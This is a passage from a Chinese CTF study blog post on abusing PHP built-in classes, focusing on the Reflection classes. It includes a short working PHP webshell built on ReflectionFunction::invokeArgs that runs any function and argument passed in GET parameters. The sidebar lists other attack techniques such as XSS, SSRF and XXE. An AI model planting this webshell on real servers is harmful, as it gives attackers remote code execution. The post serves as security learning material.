ReflectionMethod('FlagIsHere','GiveMeFlag');</span><br><span class="line">var_dump($ref-&gt;getDocComment());</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/ab758827/1765946508302-14d5f0cf-1b0c-40e4-be96-7ffeaec48d00.png" alt="img"></p>
<h2 id="使用ReflectionClass类获取类的属性和方法名"><a href="#使用ReflectionClass类获取类的属性和方法名" class="headerlink" title="使用ReflectionClass类获取类的属性和方法名"></a>使用ReflectionClass类获取类的属性和方法名</h2><ul>
<li>ReflectionClass 类报告了一个类的有关信息。其中初始化方法能够返回类的实例。</li>
</ul>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public ReflectionClass::__construct(mixed $argument)</span><br></pre></td></tr></tbody></table></figure>

<ul>
<li><code>$argument</code>：既可以是包含类名的字符串（string）也可以是对象（object）。</li>
</ul>
<p>用法如下</p>
<p>example：</p>
<p><img src="/posts/ab758827/1765947016945-764de7a8-02b3-4e07-8c8d-a74fb84cd018.png" alt="img"></p>
<p>把类里面属性和方法的名字都能够显示出来。</p>
<h2 id="使用ReflectionFunction类写Webshell"><a href="#使用ReflectionFunction类写Webshell" class="headerlink" title="使用ReflectionFunction类写Webshell"></a>使用ReflectionFunction类写Webshell</h2><p><strong>ReflectionFunction</strong> 类报告了一个函数的有关信息。其中<code>invokeArgs()</code>方法能够用来写Webshell。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public ReflectionFunction::invokeArgs(array $args): mixed</span><br></pre></td></tr></tbody></table></figure>

<ul>
<li><code>$args</code>：传递给函数的参数是一个数组，像 <code>call_user_func_array()</code> 的工作方式。</li>
</ul>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function title($title, $name)</span><br><span class="line">{</span><br><span class="line">    return sprintf("%s. %s\r\n", $title, $name); </span><br><span class="line">} //方法</span><br><span class="line"> </span><br><span class="line">$function = new ReflectionFunction('title');</span><br><span class="line"> </span><br><span class="line">echo $function-&gt;invokeArgs(array('Dr', 'Phil')); //参数</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/ab758827/1765947281273-e2d6c788-891f-4b15-8d6b-ccb102f5e5c8.png" alt="img"></p>
<p>写入webshell</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $func = new ReflectionFunction($_GET[m]);</span><br><span class="line">    echo $func-&gt;invokeArgs(array($_GET[c]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/ab758827/1765947461095-38cd1053-2bc9-49a7-b49f-4795ae48bf08.png" alt="img"></p>
<p>题目就是，大家可以去看一下<a target="_blank" rel="noopener" href="https://tari.moe/2021/2021hmb-offline.html">https://tari.moe/2021/2021hmb-offline.html</a></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://drun1baby.top/2023/04/11/PHP-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/#0x09-%E5%8F%8D%E5%B0%84%E7%B1%BB-Reflection">https://drun1baby.top/2023/04/11/PHP-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/#0x09-%E5%8F%8D%E5%B0%84%E7%B1%BB-Reflection</a></p>
<p><a target="_blank" rel="noopener" href="https://tari.moe/2021/2021hmb-offline.html">https://tari.moe/2021/2021hmb-offline.html</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://lxu2n.github.io">红烧花园宝宝</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lxu2n.github.io/posts/ab758827/">https://lxu2n.github.io/posts/ab758827/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://lxu2n.github.io" target="_blank">红烧花园宝宝</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/image/1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/982d6246/" title="海洋cms"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">海洋cms</div></div><div class="info-2"><div class="info-item-1">flag1 fscan扫描完，找个poc rce 1234567891011121314POST /search.php HTTP/1.1Host: 113.45.161.52:89Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://113.45.161.52:89/index.phpAccept-Encoding: gzip, deflate, ...</div></div></div></a><a class="pagination-related" href="/posts/ad82e6ae/" title="shiro721"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">shiro721</div></div><div class="info-2"><div class="info-item-1">前言shiro721是shiro550更新过后的一个版本，不同于shiro550，它使用的是动态密钥对Cookie值rememberMe进行的加密，这样就避免了攻击者的攻击，但是真的能避免吗?既然有这个漏洞，那就说明无法避免，主要还是因为shiro使用了AES-CBC的加密方式，这时我们就可以使用Padding Oracle Attack的方法（不需要密钥也可以伪造密文）进行攻击。 环境准备https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war 下载war包，解压之后打开这个项目将cc换成3.2.1的版本 创建一个新的项目  踩坑点：不要使用jdk版本8u65，版本太低会报错误 将刚刚解压的war包里的内容放入webapp中  依赖的添加，在lib下  添加tomcat启动（记得工件）  最后启动环境，我们可以看到如下界面  漏洞利用使用ysoserial工具生成URLDNS的payload 1java -jar ysoserial.jar URLDNS http://56db4471.log....</div></div></div></a></nav><hr class="custom-hr"><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info-name">红烧花园宝宝</div><div class="author-info-description">生命只有一次,我只能爱你一世</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">41</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/LXu2n/LXu2n.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-number">1.</span> <span class="toc-text">常用的php原生类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Error-Exception%E5%86%85%E7%BD%AE%E7%B1%BB%E8%BF%9B%E8%A1%8Cxss"><span class="toc-number">2.</span> <span class="toc-text">使用Error/Exception内置类进行xss</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E7%B1%BBError"><span class="toc-number">2.1.</span> <span class="toc-text">内置类Error</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E7%B1%BBException"><span class="toc-number">2.2.</span> <span class="toc-text">内置类Exception</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-xss%E4%B9%8B%E5%85%89"><span class="toc-number">2.3.</span> <span class="toc-text">[BJDCTF 2nd]xss之光</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Error-Exception%E5%86%85%E7%BD%AE%E7%B1%BB%E7%BB%95%E8%BF%87hash"><span class="toc-number">3.</span> <span class="toc-text">使用Error/Exception内置类绕过hash</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Error%E7%B1%BB"><span class="toc-number">3.1.</span> <span class="toc-text">Error类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exception%E7%B1%BB"><span class="toc-number">3.2.</span> <span class="toc-text">Exception类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xgame2025-Rubbish-Unser"><span class="toc-number">3.3.</span> <span class="toc-text">[0xgame2025]Rubbish_Unser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%9F%E8%8B%8F%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E7%9F%A5%E8%AF%86%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B-web1"><span class="toc-number">3.4.</span> <span class="toc-text">[江苏省第七届网络空间知识技能大赛决赛]web1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8soapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF"><span class="toc-number">4.</span> <span class="toc-text">使用soapClient类进行SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#soapClient%E7%B1%BB"><span class="toc-number">4.1.</span> <span class="toc-text">soapClient类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SoapClient-ssrf"><span class="toc-number">4.2.</span> <span class="toc-text">SoapClient+ssrf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">4.2.1.</span> <span class="toc-text">题目</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Directorylterator%E7%B1%BB%E7%BB%95%E8%BF%87open-basedir"><span class="toc-number">5.</span> <span class="toc-text">使用Directorylterator类绕过open_basedir</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-SimpleXMLElement-%E7%B1%BB%E8%BF%9B%E8%A1%8C-XXE"><span class="toc-number">6.</span> <span class="toc-text">使用 SimpleXMLElement 类进行 XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2018-Homework"><span class="toc-number">6.1.</span> <span class="toc-text">[SUCTF 2018]Homework</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-ZipArchive-%E7%B1%BB%E6%9D%A5%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6"><span class="toc-number">7.</span> <span class="toc-text">使用 ZipArchive 类来删除文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toc-number">7.1.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8SplFileObject%E6%9D%A5%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E8%AF%BB%E5%8F%96"><span class="toc-number">8.</span> <span class="toc-text">使用SplFileObject来进行文件内容读取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GHCTF-2025-Popppppp"><span class="toc-number">8.1.</span> <span class="toc-text">[GHCTF 2025]Popppppp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E7%B1%BBReflection"><span class="toc-number">9.</span> <span class="toc-text">反射类Reflection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ReflectionClass%E7%B1%BB%E8%8E%B7%E5%8F%96%E7%B1%BB%E7%9A%84%E5%B1%9E%E6%80%A7%E5%92%8C%E6%96%B9%E6%B3%95%E5%90%8D"><span class="toc-number">9.1.</span> <span class="toc-text">使用ReflectionClass类获取类的属性和方法名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ReflectionFunction%E7%B1%BB%E5%86%99Webshell"><span class="toc-number">9.2.</span> <span class="toc-text">使用ReflectionFunction类写Webshell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">10.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/3dd769b8/" title="moectf2025_第23关">moectf2025_第23关</a><time datetime="2026-01-07T10:05:31.000Z" title="发表于 2026-01-07 18:05:31">2026-01-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/67304d02/" title="RMI_2">RMI_2</a><time datetime="2025-12-31T08:57:09.000Z" title="发表于 2025-12-31 16:57:09">2025-12-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/fe391cb8/" title="RMI_1">RMI_1</a><time datetime="2025-12-26T08:57:27.000Z" title="发表于 2025-12-26 16:57:27">2025-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/26798085/" title="Javacc">Javacc</a><time datetime="2025-12-25T06:32:59.000Z" title="发表于 2025-12-25 14:32:59">2025-12-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/a17ec151/" title="Cap">Cap</a><time datetime="2025-12-22T12:32:50.000Z" title="发表于 2025-12-22 20:32:50">2025-12-22</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">©2025 - 2026 By 红烧花园宝宝</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'

  const createScriptElement = config => {
    const ele = document.createElement('script')
    Object.entries(config).forEach(([key, value]) => {
      ele.setAttribute(key, value)
    })
    return ele
  }

  const loadGiscus = (el = document, key) => {
    const mappingConfig = isShuoshuo
      ? { 'data-mapping': 'specific', 'data-term': key }
      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }

    const giscusConfig = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'LXu2n/LXu2n.github.io',
      'data-repo-id': 'R_kgDOOuja2g',
      'data-category-id': 'DIC_kwDOOuja2s4C020T',
      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
      'data-reactions-enabled': '1',
      crossorigin: 'anonymous',
      async: true,
      ...option,
      ...mappingConfig
    }

    const scriptElement = createScriptElement(giscusConfig)

    el.querySelector('#giscus-wrap').appendChild(scriptElement)

    if (isShuoshuo) {
      window.shuoshuoComment.destroyGiscus = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }
  }

  const changeGiscusTheme = theme => {
    const iframe = document.querySelector('#giscus-wrap iframe')
    if (iframe) {
      const message = {
        giscus: {
          setConfig: {
            theme: getGiscusTheme(theme)
          }
        }
      }
      iframe.contentWindow.postMessage(message, 'https://giscus.app')
    }
  }

  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')

  if (isShuoshuo) {
    'Giscus' === 'Giscus'
      ? window.shuoshuoComment = { loadComment: loadGiscus }
      : window.loadOtherComment = loadGiscus
    return
  }

  if ('Giscus' === 'Giscus' || !false) {
    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
    else loadGiscus()
  } else {
    window.loadOtherComment = loadGiscus
  }
})()</script></div><script defer="" src="/js/bubble.js"></script><script src="/styles/fish.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>